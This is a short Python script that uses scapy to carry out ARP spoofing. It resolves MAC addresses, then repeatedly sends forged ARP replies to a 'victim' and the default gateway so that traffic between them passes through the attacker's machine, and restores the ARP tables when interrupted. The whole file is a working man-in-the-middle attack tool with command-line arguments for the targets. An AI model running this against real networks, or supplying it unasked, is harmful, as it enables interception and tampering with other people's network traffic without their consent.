import scapy.all as scapy
import time
import argparse

def scanner(ip):
    arp_request=scapy.ARP(pdst=ip)
    mac_address=scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    packet=mac_address/arp_request
    client_result=scapy.srp(packet,verbose=False,timeout=1)[0]
    return client_result[0][1].hwsrc



def arpspoofing(source_ip,target_ip):
    target_mac=scanner(target_ip)
    
    #print(target_mac)
    #saying to victim that default-gateway is ourself by changing the macaddress
    response_packet=scapy.ARP(psrc=source_ip,pdst=target_ip,hwdst=target_mac,op=2)
    
    scapy.send(response_packet,verbose=False)

def revertable(source_ip,target_ip):
    source_mac=scanner(source_ip)
    target_mac=scanner(target_ip)

    packet=scapy.ARP(psrc=source_ip,hwsrc=source_mac,pdst=target_ip,hwdst=target_mac,op=2)
    scapy.send(packet,verbose=False)

def parser():
    parser=argparse.ArgumentParser()
    parser.add_argument('-s','--source_ip',dest='source_ip',help="Enter the source ipadress")
    parser.add_argument('-t','--target_ip',dest='target_ip',help="Enter the target ipaddress")
    args=parser.parse_args()
    return args

result=parser()
#for sending response to victim or D.G
source_ip=result.source_ip
target_ip=result.target_ip
#for sending response to victim or D.G
source_ip1=result.target_ip
target_ip1=result.source_ip
    
try:
    packet_count=0
    while True:
        arpspoofing(source_ip,target_ip)
        arpspoofing(source_ip1,target_ip1)
        time.sleep(1)
        packet_count+=1
        print("\r packetcount:",packet_count)
except KeyboardInterrupt as key:
    print("pressed the ctrl+c ")
    revertable(source_ip,target_ip)
    revertable(source_ip1,target_ip1)
    
